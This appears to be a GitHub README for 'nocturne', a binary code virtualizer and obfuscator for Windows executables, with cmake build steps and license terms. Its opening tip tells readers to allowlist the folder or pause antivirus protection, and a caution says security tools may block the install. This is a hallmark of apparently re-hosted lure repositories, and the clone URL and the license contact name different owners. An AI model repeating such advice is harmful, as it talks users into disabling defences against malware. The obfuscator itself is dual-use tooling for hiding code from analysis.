# nocturne


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/masterraventrowel/nocturne-779.git
cd nocturne-779
mkdir build && cd build
cmake ..
cmake --build . --config Release
```


Named after one of my favorite games, "nocturne" is a bin2bin x86-64 PE code virtualizer and binary rewriter.

# Features
* Native Call Bridge
* 30+ VM Handlers
* Built-in junk code obfuscation
* Thread-safe per-invocation VM state


# Screenshots
Before Virtualization:
<img width="999" height="656" alt="image" src="https://github.com/masterraventrowel/nocturne-779/7b035cf6-b0e8-4db3-badf-0597e9a5bf33" />

After Virtualization:

<img width="633" height="230" alt="image" src="https://github.com/masterraventrowel/nocturne-779/bbeaa4d1-60d3-4001-9540-3ab6cc8230b3" />


Obfuscated dispatcher loop:
<img width="1200" height="600" alt="image" src="https://github.com/masterraventrowel/nocturne-779/fff1a19e-8d60-40ee-92c4-099fce60d1d9" />

# Dependencies
```
LIEF
Zydis
argparse
```

# Disclaimer
First and foremost, this is mostly a POC project. Please don't expect it to be **too** stable. With that being said, I will be progressively adding more features/fixes to this as time goes on.

If there are any features / handlers you want implemented, I implore you to open an issue. I welcome any and all contributions.

# License

This project is source-available, not open source.

The source code is available under the PolyForm Noncommercial License 1.0.0.

You may use, study, modify, and share this software for noncommercial purposes, subject to the license terms.

Commercial use, enterprise use, internal company use, production business use, hosted services, paid products, client work, consulting work, or organizational deployment is not permitted without a separate written license.

For commercial or enterprise licensing, contact: nshaul2006@gmail.com / @nodiuus 


<!-- Last updated: 2026-06-06 16:19:12 -->
